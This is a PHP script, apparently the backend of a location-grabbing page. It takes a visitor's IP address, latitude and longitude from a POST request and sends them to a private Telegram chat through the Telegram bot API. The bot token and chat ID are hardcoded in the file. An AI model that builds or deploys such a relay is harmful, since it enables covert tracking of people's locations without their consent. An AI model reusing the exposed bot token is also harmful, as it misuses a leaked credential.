<?php
// Bot Token dan Chat ID - disimpan dengan aman di backend
$botToken = "7906787726:AAEAEUuW2mteAyjl1PknB8ubmdw_J6GmH20"; 
$chatId = "6643420998"; 

// Ambil data dari request POST
$data = json_decode(file_get_contents("php://input"), true);

if (isset($data['ip'], $data['latitude'], $data['longitude'])) {
    $ip = htmlspecialchars($data['ip']);
    $latitude = htmlspecialchars($data['latitude']);
    $longitude = htmlspecialchars($data['longitude']);

    $message = "IP: $ip\nLatitude: $latitude\nLongitude: $longitude";

    // Kirim data ke Telegram
    $telegramApi = "https://api.telegram.org/bot$botToken/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramApi);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    curl_close($ch);

    echo json_encode(['success' => true, 'response' => $response]);
} else {
    echo json_encode(['success' => false, 'message' => 'Invalid data']);
}
?>
